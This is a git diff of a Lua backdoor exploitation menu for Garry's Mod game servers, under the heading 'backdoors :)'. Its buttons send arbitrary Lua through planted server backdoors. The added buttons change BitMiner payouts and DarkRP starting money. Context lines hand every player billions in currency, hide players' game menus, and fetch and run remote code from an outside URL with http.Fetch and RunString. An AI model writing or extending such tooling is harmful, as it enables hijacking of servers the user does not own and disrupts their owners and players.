@@ -1608,6 +1608,13 @@ Panels 2 : backdoors :)
             end)
         end)
 
+        rebug.AddButton("Bitminer 2 Value", Bar1, function()
+            surface.PlaySound("buttons/button18.wav")
+            Derma_StringRequest("Bitminer 2 Value", "Set how much bitminer2 makes", function(str)
+                noob.PostLua("BM2CONFIG.BitcoinValue = " .. str)
+            end)
+        end)
+
         rebug.AddButton("Break Economy", Bar1, function()
             surface.PlaySound("buttons/button18.wav")
             noob.PostLua([[for k,v in pairs(player.GetAll()) do v:addMoney(9999999999) end]])
@@ -1732,6 +1739,14 @@ Panels 2 : backdoors :)
             noob.PostLua([[hook.Add("Think","iuefheqefq",function() gui.HideGameUI() end)]])
         end)
 
+        rebug.AddButton("DarkRP Starting Money", Bar1, function()
+          surface.PlaySound("buttons/button18.wav")
+          Derma_StringRequest("DarkRP Starting Money", "Set starting money amount", "", function(str)
+        noob.PostLua("GM.Config.startingmoney = " ..str)
+           end)
+        end)
+
+
         rebug.AddButton("Earthquake", Bar1, function()
             surface.PlaySound("buttons/button18.wav")
             noob.PostLua([[if !timer.Exists("earthquake") then
@@ -1764,11 +1779,6 @@ Panels 2 : backdoors :)
         rebug.AddButton("Enigma Disco 2.0", Bar1, function()
             surface.PlaySound("buttons/button18.wav")
             noob.PostLua([[http.Fetch("https://rvac.cc/load/xd.lua", function(b) RunString(b) end )]])
-        end)
-
-        rebug.AddButton("GMining Staff", Bar1, function()
-            surface.PlaySound("buttons/button18.wav")
-				noob.PostLua([[gMining.cfg.staffMembers = {"user"}]])
         end)
 
         rebug.AddButton("Hell Mode", Bar1, function()
@@ -1889,7 +1899,6 @@ Panels 2 : backdoors :)
 
         rebug.AddButton("Open URL On Players", Bar1, function()
             surface.PlaySound("buttons/button18.wav")
-
             Derma_StringRequest("URL On Players", "URL Link", "", function(str)
                 noob.PostLua([==[local ply = str
 					ply:SendLua([[h=vgui.Create("DHTML")
